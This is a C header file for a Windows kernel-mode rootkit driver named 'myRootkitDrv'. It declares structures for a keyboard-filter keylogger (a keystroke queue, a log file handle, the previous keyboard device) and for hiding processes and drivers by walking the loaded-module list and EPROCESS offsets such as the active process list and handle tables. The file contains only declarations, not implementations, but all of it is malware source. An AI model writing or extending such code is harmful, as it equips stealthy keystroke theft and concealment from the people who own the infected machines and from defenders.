#ifndef _ROOTKIT_H_
#define _ROOTKIT_H_

#define		ROOTKIT_WIN32_DEV_NAME		L"\\DosDevices\\myRootkitDrv"
#define		ROOTKIT_DEV_NAME			L"\\Device\\myRootkitDrv"

typedef struct _MODULE_ENTRY {
	LIST_ENTRY le_mod;
	ULONG  unknown[4];
	ULONG  base;
	ULONG  driver_start;
	ULONG  unk1;
	UNICODE_STRING driver_Path;
	UNICODE_STRING driver_Name;
} MODULE_ENTRY, *PMODULE_ENTRY;

PMODULE_ENTRY g_PsLoadedModuleList;

typedef struct
{
	LIST_ENTRY ListEntry;
	char KeyData;
	char KeyFlags;
} KEY_DATA;

typedef struct {
	PVOID pointer;
	HANDLE hLogFile;				// 
	KSEMAPHORE semaphore;			// sync mechanism
	KSPIN_LOCK spinlock;			// sync mechanism
	LIST_ENTRY listHead;			// queue to hold not processed keys
	BOOLEAN bThreadRunning;			// should thread be running ?
	PETHREAD pThread;				// our worker thread
	PDEVICE_OBJECT PrevDevice;		//we keep last keyboard device
} ROOTKIT_EXT, *PROOTKIT_EXT;

NTSTATUS CompleteRequest(PIRP Irp);
NTSTATUS CompleteKeyboard(IN PIRP Irp);

typedef struct {
    ULONG   processName;
    ULONG   processPid;
    ULONG   activeProcessListOffset;
} NTOSKRNL_OFFSETS, *PNTOSKRNL_OFFSETS;

typedef struct {
	ULONG	nameOffset;
	ULONG	pidOffset;
	ULONG	flinkOffset;
	ULONG	handleTableOffset;
	ULONG	handleListOffset;
	ULONG	listEntryOffset;
	ULONG	handleTablePidOffset;
	ULONG	activeProcessListOffset;
	ULONG	eprocOffsetFromHandleTable;
	//more to come...
} ROOTKIT_SETUP_DATA, *PROOTKIT_SETUP_DATA;

#endif
